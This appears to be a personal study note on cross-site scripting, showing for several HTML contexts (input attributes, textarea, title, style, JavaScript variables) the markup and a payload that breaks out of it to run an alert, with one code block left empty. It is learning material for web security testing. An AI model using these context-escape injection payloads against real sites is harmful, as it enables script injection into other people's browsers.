____

# Basic XSS

```html
<script>alert("1")</script>
```

![[Pasted image 20241120124025.png]]

# Escaping Context

## Input

```html
<input value="test">
```

```html
"><script>alert(1)</script>
```

![[Pasted image 20241120125055.png]]

```html
" onmouseover=alert(1);//
```

![[Pasted image 20241120125551.png]]

## Textarea

```html
<textarea>test</textarea>
```

```html
</textarea><script>alert(1)</script>
```

![[Pasted image 20241120131231.png]]

## Title

```html
<title>Welcome, test</title>
```

```html
</title><script>alert(1)</script>
```

## Style

```html
<style>
        body {
            background-color: test;
        }
    </style>
```

```html
</style><script>alert(1)</script>
```

## Javascript variables

```html
<script>
var name = 'test'; $('span#name').html( name );
</script>
```

```html

```
![[Pasted image 20241120133508.png]]